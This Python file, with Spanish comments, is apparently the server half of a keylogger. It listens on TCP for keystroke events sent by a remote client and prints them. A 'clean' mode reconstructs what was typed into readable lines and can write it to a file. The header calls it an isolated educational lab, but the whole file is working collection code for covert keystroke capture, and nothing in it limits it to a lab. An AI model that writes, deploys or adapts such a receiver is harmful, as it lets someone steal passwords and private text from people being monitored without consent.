#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
servidor.py — Laboratorio educativo (entorno aislado).

Escucha en TCP, recibe eventos NDJSON del cliente y los muestra.

Dos modos de presentación:
  * Modo por defecto  : volcado completo de eventos (press/release, uno por línea).
  * Modo --clean      : muestra solo el texto tecleado, agrupado en líneas de ráfaga.
                        Ignora 'release', representa teclas especiales como tokens
                        legibles ([ENTER], [TAB], [WINDOWS], [CTRL]...), maneja
                        Backspace / Enter y cierra línea tras `idle_timeout`
                        segundos sin actividad. No genera líneas vacías.

USO EXCLUSIVO EN LABORATORIO AISLADO Y CON FINES DEFENSIVOS/DIDÁCTICOS.

Variables de entorno:
    LAB_LISTEN_IP        IP de escucha (default 0.0.0.0)
    LAB_LISTEN_PORT      Puerto TCP   (default 5000)
    LAB_LOG_LEVEL        DEBUG|INFO|WARNING|ERROR (default INFO)
    LAB_LOG_FILE         Ruta del log (default servidor.log)
    LAB_NO_COLOR         Si vale "1", desactiva colores ANSI
    LAB_CLEAN            Si vale "1", activa el modo clean (equivalente a --clean)
    LAB_IDLE_TIMEOUT     Segundos sin teclas antes de cerrar la línea (default 5.0)
    LAB_CLEAN_DUMP       Ruta de fichero donde volcar las líneas cerradas (opcional)
"""

from __future__ import annotations

import argparse
import json
import logging
import os
import queue
import signal
import socket
import sys
import threading
import time
import unicodedata
from dataclasses import dataclass
from datetime import datetime
from typing import Optional


# ---------------------------------------------------------------------------
# 1. Configuración
# ---------------------------------------------------------------------------
@dataclass(frozen=True)
class Config:
    listen_ip: str
    listen_port: int
    log_level: str
    log_file: str
    use_color: bool
    clean: bool
    idle_timeout: float
    clean_dump: Optional[str]

    @staticmethod
    def from_env_and_args() -> "Config":
        p = argparse.ArgumentParser(
            description="Servidor de laboratorio (recibe eventos de teclado)."
        )
        p.add_argument("--ip", help="IP de escucha (default 0.0.0.0)")
        p.add_argument("--port", type=int, help="Puerto TCP (default 5000)")
        p.add_argument(
            "--clean",
            action="store_true",
            help="Modo limpio: solo texto tecleado, una línea por ráfaga.",
        )
        p.add_argument(
            "--idle-timeout",
            type=float,
            help="Segundos sin teclas antes de cerrar la línea (default 5.0).",
        )
        a = p.parse_args()

        ip = a.ip or os.getenv("LAB_LISTEN_IP", "0.0.0.0")
        port = a.port or int(os.getenv("LAB_LISTEN_PORT", "5000"))
        level = os.getenv("LAB_LOG_LEVEL", "INFO").upper()
        log_file = os.getenv("LAB_LOG_FILE", "servidor.log")
        color = os.getenv("LAB_NO_COLOR", "0") != "1" and sys.stdout.isatty()
        clean = a.clean or os.getenv("LAB_CLEAN", "0") == "1"
        idle_timeout = a.idle_timeout or float(os.getenv("LAB_IDLE_TIMEOUT", "5.0"))
        clean_dump = os.getenv("LAB_CLEAN_DUMP") or None

        return Config(ip, port, level, log_file, color, clean, idle_timeout, clean_dump)


# ---------------------------------------------------------------------------
# 2. Logging
# ---------------------------------------------------------------------------
def setup_logging(level: str, log_file: str) -> logging.Logger:
    logger = logging.getLogger("servidor")
    logger.setLevel(getattr(logging, level, logging.INFO))
    fmt = logging.Formatter(
        "%(asctime)s | %(levelname)-7s | %(threadName)-18s | %(message)s",
        datefmt="%Y-%m-%d %H:%M:%S",
    )
    fh = logging.FileHandler(log_file, encoding="utf-8")
    fh.setFormatter(fmt)
    logger.addHandler(fh)

    # Handler de consola solo si hay stdout real (por si corre sin TTY).
    if sys.stdout is not None and getattr(sys.stdout, "isatty", lambda: False)():
        sh = logging.StreamHandler(sys.stdout)
        sh.setFormatter(fmt)
        logger.addHandler(sh)
    return logger


# ---------------------------------------------------------------------------
# 3. Renderer clásico: volcado completo por evento
# ---------------------------------------------------------------------------
class Renderer(threading.Thread):
    """
    Consume la cola de eventos y los imprime con formato tabular.
    Separar render de red evita que un cliente lento bloquee al servidor.
    """

    _C = {
        "reset": "\033[0m", "dim": "\033[2m", "bold": "\033[1m",
        "cyan": "\033[36m", "green": "\033[32m", "yellow": "\033[33m",
        "red": "\033[31m", "magenta": "\033[35m",
    }

    def __init__(self, in_queue: "queue.Queue[dict]", color: bool, logger: logging.Logger):
        super().__init__(name="Renderer", daemon=True)
        self._q = in_queue
        self._color = color
        self._log = logger
        self._stop = threading.Event()

    def _c(self, name: str, text: str) -> str:
        if not self._color:
            return text
        return f"{self._C.get(name,'')}{text}{self._C['reset']}"

    def stop(self) -> None:
        self._stop.set()

    def run(self) -> None:
        header = f"{'HORA':<12} {'ORIGEN':<22} {'EVENTO':<8} {'TECLA':<20}"
        print(self._c("bold", header))
        print(self._c("dim", "-" * len(header)))

        while not self._stop.is_set() or not self._q.empty():
            try:
                ev = self._q.get(timeout=0.5)
            except queue.Empty:
                continue
            self._render_one(ev)

    def _render_one(self, ev: dict) -> None:
        ts = datetime.fromtimestamp(ev.get("recv_ts", time.time())).strftime("%H:%M:%S.%f")[:-3]
        origin = f"{ev.get('peer_ip','?')}:{ev.get('peer_port','?')}"
        kind = ev.get("kind", "?")
        value = str(ev.get("value", ""))
        if len(value) > 20:
            value = value[:17] + "..."

        kind_color = {"press": "green", "release": "yellow"}.get(kind, "cyan")
        line = (
            f"{self._c('dim', ts):<12} "
            f"{self._c('magenta', origin):<22} "
            f"{self._c(kind_color, kind):<8} "
            f"{value:<20}"
        )
        print(line)
        self._log.info("evt peer=%s kind=%s value=%r", origin, kind, value)


# ---------------------------------------------------------------------------
# 4. Renderer "clean": una sola línea de texto en vivo
# ---------------------------------------------------------------------------
class CleanRenderer(threading.Thread):
    """
    Modo --clean: muestra el flujo de teclado como líneas de texto.

    Reglas:
      * Solo se procesan eventos 'press' (los 'release' se ignoran).
      * Solo se añaden teclas imprimibles y teclas especiales del mapa.
      * Teclas especiales se representan como tokens: [ENTER], [TAB], [WINDOWS]...
      * Backspace borra el último carácter o el token completo si es [XXX].
      * Enter fuerza salto de línea inmediato.
      * Si pasan `idle_timeout` segundos sin actividad y el buffer no está
        vacío, se cierra la línea. Si el buffer ya está vacío, no se imprime
        una línea vacía ni se generan saltos repetidos.
      * El primer carácter de cada línea se prefija con un timestamp para
        tener referencia temporal, sin ensuciar el flujo.
    """

    _C = {
        "reset": "\033[0m", "dim": "\033[2m", "bold": "\033[1m",
        "cyan": "\033[36m", "green": "\033[32m", "yellow": "\033[33m",
        "red": "\033[31m", "magenta": "\033[35m",
    }

    # Teclas especiales → representación legible en el flujo.
    # 'space' se trata como espacio real; 'backspace' tiene lógica propia.
    _SPECIAL_KEYS = {
        # Modificadores / sistema
        "cmd":          "[WINDOWS]",
        "cmd_l":        "[WINDOWS]",
        "cmd_r":        "[WINDOWS]",
        "shift":        "[SHIFT]",
        "shift_l":      "[SHIFT]",
        "shift_r":      "[SHIFT]",
        "ctrl":         "[CTRL]",
        "ctrl_l":       "[CTRL]",
        "ctrl_r":       "[CTRL]",
        "alt":          "[ALT]",
        "alt_l":        "[ALT]",
        "alt_r":        "[ALT]",
        "alt_gr":       "[ALTGR]",
        "caps_lock":    "[CAPS]",
        "num_lock":     "[NUMLK]",
        "scroll_lock":  "[SCRLK]",
        # Edición / control
        "enter":        "[ENTER]",
        "tab":          "[TAB]",
        "esc":          "[ESC]",
        "delete":       "[DEL]",
        "insert":       "[INS]",
        "home":         "[HOME]",
        "end":          "[END]",
        "page_up":      "[PGUP]",
        "page_down":    "[PGDN]",
        "menu":         "[MENU]",
        "print_screen": "[PRTSC]",
        "pause":        "[PAUSE]",
        # Flechas
        "up":           "[UP]",
        "down":         "[DOWN]",
        "left":         "[LEFT]",
        "right":        "[RIGHT]",
    }

    def __init__(
        self,
        in_queue: "queue.Queue[dict]",
        idle_timeout: float,
        color: bool,
        logger: logging.Logger,
        dump_path: Optional[str] = None,
    ):
        super().__init__(name="CleanRenderer", daemon=True)
        self._q = in_queue
        self._idle_timeout = idle_timeout
        self._color = color
        self._log = logger
        self._dump_path = dump_path
        self._stop = threading.Event()

        self._buffer: list[str] = []
        self._last_event_ts: float = time.time()
        self._line_has_content = False

    # ---- colores ------------------------------------------------------------
    def _c(self, name: str, text: str) -> str:
        if not self._color:
            return text
        return f"{self._C.get(name,'')}{text}{self._C['reset']}"

    # ---- API ----------------------------------------------------------------
    def stop(self) -> None:
        self._stop.set()

    def run(self) -> None:
        print(self._c("bold", "[clean] teclas en vivo (Ctrl+C para salir)"))
        print(self._c("dim", "-" * 60))

        while not self._stop.is_set() or not self._q.empty():
            try:
                ev = self._q.get(timeout=0.2)
                self._handle_event(ev)
            except queue.Empty:
                self._maybe_flush_idle()

        # Al salir, cerramos la línea pendiente si la hay.
        if self._line_has_content:
            self._newline(reason="shutdown")

    # ---- lógica de render ---------------------------------------------------
    def _handle_event(self, ev: dict) -> None:
        if ev.get("kind") != "press":
            return

        value = ev.get("value")
        now = ev.get("recv_ts", time.time())

        # Cierre de línea por inactividad
        if (now - self._last_event_ts) > self._idle_timeout and self._line_has_content:
            self._newline(reason="idle")
        self._last_event_ts = now

        # Teclas con lógica propia
        if value == "enter":
            self._newline(reason="enter")
            return
        if value == "backspace":
            self._backspace()
            return
        if value == "space":
            self._append(" ")
            return

        # Teclas especiales con token legible
        if value in self._SPECIAL_KEYS:
            token = self._SPECIAL_KEYS[value]
            self._append(token, token=True)
            return

        # Carácter imprimible normal
        if not isinstance(value, str) or len(value) != 1:
            return
        if not value.isprintable():
            return
        if unicodedata.category(value).startswith("C"):
            return

        self._append(value)

    def _append(self, text: str, *, token: bool = False) -> None:
        """
        Añade texto al buffer y a la pantalla.
        Si `token=True`, se colorea como tecla especial.
        """
        if not self._line_has_content:
            ts = datetime.now().strftime("%H:%M:%S")
            sys.stdout.write(self._c("dim", f"[{ts}] "))
            self._line_has_content = True

        # Guardamos el texto tal cual en el buffer (para el volcado a fichero).
        self._buffer.append(text)

        if token:
            sys.stdout.write(self._c("yellow", text))
        else:
            sys.stdout.write(text)
        sys.stdout.flush()

    def _backspace(self) -> None:
        if not self._buffer:
            return

        last = self._buffer[-1]

        # Si es un token [XXX], borrarlo entero.
        if last.startswith("[") and last.endswith("]"):
            self._buffer.pop()
            for _ in range(len(last)):
                sys.stdout.write("\b \b")
            sys.stdout.flush()
            return

        # Carácter normal: borrar uno.
        self._buffer.pop()
        sys.stdout.write("\b \b")
        sys.stdout.flush()

    def _newline(self, reason: str) -> None:
        # Si no hay nada pendiente, no imprimimos nada (evita bucles vacíos).
        if not self._line_has_content and not self._buffer:
            return

        sys.stdout.write("\n")
        sys.stdout.flush()

        # Volcado opcional a fichero
        if self._dump_path and self._buffer:
            try:
                with open(self._dump_path, "a", encoding="utf-8") as f:
                    f.write(
                        f"[{datetime.now().isoformat(timespec='seconds')}] "
                        f"{''.join(self._buffer)}\n"
                    )
            except OSError as exc:
                self._log.warning("No se pudo volcar línea a %s: %s", self._dump_path, exc)

        if reason == "idle":
            self._log.debug("Línea cerrada por inactividad")
        elif reason == "enter":
            self._log.debug("Línea cerrada por Enter")

        self._buffer.clear()
        self._line_has_content = False

    def _maybe_flush_idle(self) -> None:
        if not self._line_has_content:
            return
        if (time.time() - self._last_event_ts) >= self._idle_timeout:
            self._newline(reason="idle")


# ---------------------------------------------------------------------------
# 5. Manejador por conexión
# ---------------------------------------------------------------------------
class ConnectionHandler(threading.Thread):
    def __init__(
        self,
        conn: socket.socket,
        addr: tuple,
        out_queue: "queue.Queue[dict]",
        logger: logging.Logger,
    ):
        super().__init__(name=f"Conn-{addr[0]}:{addr[1]}", daemon=True)
        self._conn = conn
        self._addr = addr
        self._q = out_queue
        self._log = logger

    def run(self) -> None:
        self._log.info("Cliente conectado: %s:%s", *self._addr)
        buf = b""
        try:
            self._conn.settimeout(30.0)
            while True:
                try:
                    chunk = self._conn.recv(4096)
                except socket.timeout:
                    continue
                if not chunk:
                    break
                buf += chunk
                while b"\n" in buf:
                    line, buf = buf.split(b"\n", 1)
                    if not line.strip():
                        continue
                    self._process_line(line)
        except OSError as exc:
            self._log.warning("Error en conexión %s: %s", self._addr, exc)
        finally:
            try:
                self._conn.close()
            except OSError:
                pass
            self._log.info("Cliente desconectado: %s:%s", *self._addr)

    def _process_line(self, raw: bytes) -> None:
        try:
            ev = json.loads(raw.decode("utf-8"))
        except (UnicodeDecodeError, json.JSONDecodeError) as exc:
            self._log.warning("Línea no válida (%s): %r", exc, raw[:120])
            return
        ev["peer_ip"], ev["peer_port"] = self._addr
        ev["recv_ts"] = time.time()
        try:
            self._q.put_nowait(ev)
        except queue.Full:
            self._log.warning("Cola de render llena, descartando evento")


# ---------------------------------------------------------------------------
# 6. Servidor TCP
# ---------------------------------------------------------------------------
class TcpServer:
    def __init__(self, cfg: Config, logger: logging.Logger):
        self._cfg = cfg
        self._log = logger
        self._stop = threading.Event()
        self._sock: Optional[socket.socket] = None

        # Cola compartida entre ConnectionHandler (productor) y Renderer (consumidor).
        self._event_queue: "queue.Queue[dict]" = queue.Queue(maxsize=10_000)

        if cfg.clean:
            self._renderer: threading.Thread = CleanRenderer(
                self._event_queue,
                cfg.idle_timeout,
                cfg.use_color,
                logger,
                dump_path=cfg.clean_dump,
            )
        else:
            self._renderer = Renderer(
                self._event_queue,
                cfg.use_color,
                logger,
            )

        self._handlers: list[ConnectionHandler] = []

    def _install_signal_handlers(self) -> None:
        def handler(signum, _frame):
            self._log.info("Señal %s recibida. Cerrando…", signum)
            self._stop.set()

        for sig in (signal.SIGINT, signal.SIGTERM):
            try:
                signal.signal(sig, handler)
            except (ValueError, OSError):
                pass

    def run(self) -> int:
        self._install_signal_handlers()
        self._renderer.start()

        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self._cfg.listen_ip, self._cfg.listen_port))
        self._sock.listen(5)
        self._sock.settimeout(1.0)

        mode = "clean" if self._cfg.clean else "eventos"
        self._log.info(
            "Escuchando en %s:%d (modo=%s, idle_timeout=%.1fs)",
            self._cfg.listen_ip, self._cfg.listen_port, mode, self._cfg.idle_timeout,
        )

        try:
            while not self._stop.is_set():
                try:
                    conn, addr = self._sock.accept()
                except socket.timeout:
                    continue
                except OSError as exc:
                    if self._stop.is_set():
                        break
                    self._log.error("accept() falló: %s", exc)
                    continue
                h = ConnectionHandler(conn, addr, self._event_queue, self._log)
                self._handlers.append(h)
                h.start()
        finally:
            self._shutdown()
        return 0

    def _shutdown(self) -> None:
        self._log.info("Deteniendo servidor…")
        try:
            if self._sock:
                self._sock.close()
        except OSError:
            pass
        for h in self._handlers:
            h.join(timeout=2.0)
        # Paramos el renderer y esperamos a que vacíe su cola.
        stop_fn = getattr(self._renderer, "stop", None)
        if callable(stop_fn):
            stop_fn()
        self._renderer.join(timeout=3.0)
        self._log.info("Servidor detenido")


# ---------------------------------------------------------------------------
# 7. Entry point
# ---------------------------------------------------------------------------
def main() -> int:
    cfg = Config.from_env_and_args()
    logger = setup_logging(cfg.log_level, cfg.log_file)
    return TcpServer(cfg, logger).run()


if __name__ == "__main__":
    sys.exit(main())
